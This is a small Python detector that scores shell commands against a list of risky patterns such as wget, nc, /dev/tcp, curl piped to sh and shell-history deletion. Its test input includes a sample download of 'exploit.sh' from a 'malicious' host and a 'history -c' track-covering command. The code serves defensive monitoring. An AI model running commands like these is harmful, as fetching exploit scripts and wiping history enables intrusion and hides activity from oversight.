import re

def check_command_for_risk(commands):
    suspicious_patterns = {
        'chmod +x': 2,
        'wget': 3,
        'base64': 3,
        'nc': 4,
        'strace': 4,
        'gdb': 4,
        'nmap': 5,
        'python -c': 5,
        'python3 -c': 5,
        'curl.*sh$': 5,
        'sudo su': 6,
        '/dev/tcp': 6,
        'history -c': 7,
        'rm ~/.bash_history': 8,
        'rm ~/.zsh_history': 8
    }

    risk_events = []
    for command in commands:
        matches = []
        total_score = 0

        for pattern, score in suspicious_patterns.items():
            if '^' in pattern or '$' in pattern or '.*' in pattern:
                if re.search(pattern, command):
                    matches.append(pattern)
                    total_score += score
                
            else:
                if pattern in command:
                    matches.append(pattern)
                    total_score += score

        if matches:
            risk_events.append({
                'command': command,
                'matches': matches, 
                'score': total_score
            })

    return risk_events

if __name__ == '__main__':
    test_commands = [
        'ls -la',
        'wget http://malicious/exploit.sh',
        'chmod +x exploit.sh',
        'history -c'
    ]

    results = check_command_for_risk(test_commands)

    print(f"In total {len(results)} suspicious teams were found:")
    for event in results:
        print(f"[🛑] {event['command']} | Matches: {event['matches']}, Risk: {event['score']}")